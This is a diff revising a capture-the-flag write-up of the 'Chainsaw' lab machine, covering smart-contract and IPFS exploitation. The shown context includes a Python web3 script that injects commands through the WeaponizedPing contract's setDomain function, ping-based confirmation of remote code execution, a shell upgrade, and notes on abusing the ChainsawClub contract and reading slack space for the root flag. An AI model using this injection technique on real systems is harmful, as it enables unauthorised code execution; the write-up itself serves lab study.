@@ -17,7 +17,6 @@ comments: true
 
 
 
-
 #### Enumeration
 
 To begin the enumeration process, a **TCP/UDP** port scan was run against the target using nmap. The purpose of scan is to quickly determine which ports are open and which services are running. 
@@ -95,7 +94,7 @@ contract WeaponizedPing
 
 #### Initial Foothold:
 
-After some enumeration and reading about etherum blockchain i was able to determine the service running in tcp port 9810 was Ganache CLI.
+After some enumeration and reading about etherum blockchain i found that the service running in tcp port 9810 was Ganache CLI.
 
 > Ganache (formally known as testrpc) is an Ethereum implementation written in Node.js meant for testing purposes while developing dapps locally.
 
@@ -116,7 +115,8 @@ Final Exploit:
 
 ```python
 #!/usr/bin/env python3
-import json, sys
+import json 
+import sys
 from web3 import Web3, HTTPProvider
 
 abi = json.loads(open('WeaponizedPing.json').read())
@@ -126,12 +126,13 @@ account = w3.eth.coinbase
 contract = w3.eth.contract(address=address, abi=abi['abi'])
 contract.functions.setDomain(sys.argv[1]).transact({"from":account,"to":address})
 contract.functions.getDomain().call()
+print("Done..")
 ```
-> Watch out the address.txt changes after every reset. Wasted a lot of time because of this :/
+> Watch out the address.txt changes after every reset, wasted a lot of time because of this :/
 
 #### User Shell
 
-Before trying to get a remote shell lets test our theory and find if we can achive RCE. Our script will send a ping request to our VPN IP.
+Before trying to get a remote shell lets test our theory and find if we can achieve RCE. Script will send a ping request to VPN IP.
 
 TCP Dump to capture ping request:
 
@@ -143,7 +144,7 @@ listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 14:11:28.037126 IP 10.10.10.142 > 10.10.14.35: ICMP echo request, id 18359, seq 1, length 64
 14:11:28.037206 IP 10.10.14.35 > 10.10.10.142: ICMP echo reply, id 18359, seq 1, length 64
 ```
-Yes we recived ICMP echo requests from our IP. Now that we know RCE possible, lets replace the ping with our payload.
+Yes we received ICMP echo requests from our IP. Now that we know RCE possible, lets replace the ping with the payload.
 
 Running the exploit:
 
@@ -162,11 +163,11 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 administrator@chainsaw:/opt/WeaponizedPing$ 
 
 ```
-Before doing anything i upgraded my shell. After that i quickly searched for the user.txt but it is not here, so back to further enumeration. 
+Before doing anything i upgraded my shell. After that quickly searched for the user.txt but it is not here, so back to further enumeration. 
 
 ###### System Enumeration :
 
-Checked to see if their is anyother users in the system, i can see user bobby which we might have to escalate to. 
+I can see user another user "bobby" in the system.
 
 ```python
 
@@ -232,7 +233,7 @@ if __name__ == "__main__":
                 generate(username,password)
 ```
 
-This script generate the RSA keys and sent it via proton mail. Lets look for these keys, we might find the keys stored in somewhere.This comment "distributing keys over Protonmail" is a interesting one. T
+This script generate the RSA keys and sent it via proton mail. Lets look for these keys, we might find the keys stored in somewhere.
 
 
 ###### InterPlanetary File System
@@ -491,7 +492,7 @@ Password:
 [*] Wrong credentials!
 
 ```
-Running the binary prompt for a username and password which we don't have. Lets check the chainsawclub.sol file.
+Running the binary prompt for a username and password which we don't have, and it generate the address.txt file. Lets check the chainsawclub.sol file.
 
 
 ChainsawClub.sol:
@@ -548,19 +549,15 @@ contract ChainsawClub {
   }
 }
 ```
-Interesting functions available in the solidity file:
+Interesting functions available in the solidity file, which will be helpful when writing the exploit:
 
 + setUsername()
 + setPassword() 
 + setApprove()
-+ getSupply() 
 + transfer() 
-+ reset() 
 
 
-Just like before we’ll write a python script to interact with the contract.
-
-Ganache-cli running locally on port 63991 
+Just like before we’ll write a python script to interact with the contract. I noticed that ganche-cli is running in localhost port 63991.
 
 ```python
 
@@ -589,13 +586,15 @@ bobby@chainsaw:~$
 ```
 #### Exploitation
 
-To make our exploit work we need to meet certain conditions:
+To make our exploit work we need to:
 
 + Set a new username and password.
 + Approve our user 
 + Transfer enough  funds to join  the club 
 
 We need to build a smiliar exploit justt like before.The exploit add a username 'd3' and set password as dog@1, approve the user and enough funds to join the club, now we can login with that credentials to chainsawclub.
+
+> Exploit code on my github repo
 
 ###### Root Shell
 
@@ -620,11 +619,12 @@ Mine deeper to get rewarded with root coin (RTC)...
 root@chainsaw:/home# 
 ```
 
-Look like we have to dig deeper to find the root.tx file. After hours of enumeration i coudn't find anything and had to ask for a hint. 
+Look like we have to dig deeper to find the root.tx file. After enumerating for sometime, i coudn't find anything and had to ask for a hint.
 
 ###### Slack Space
 
-Based on the hint i found a **bmap** folder in **/sbin** directory.
+Based on the hint i found a **bmap** tool, installed on the system and used it to read data hidden in slack-space.
+
 > bmap is a tool for creating the block map for a file or copying files using the block map,
 
 root@chainsaw:~# bmap --slack root.txt
@@ -634,9 +634,11 @@ slack size: 4044
 block size: 4096
 68c874b7d*******
 
-There is another way we can exploit this SUID binary, but i am totally exhausted after battling with this one for past few days.
+w00t, got the root flag hidden in slack-space.
+
+There is another way we can exploit this SUID binary, but i am totally exhausted after battling with this one for past few days, maybe i will come back to this and write about the second path to root.
 
 ###### Concluion
 
-This was a great box, i learned a lot about smartcontacts,blockchain and IPFS exploitation.
+This was a great box and took me a while to complete it. I learned a lot about smartcontacts,blockchain and IPFS exploitation.
 
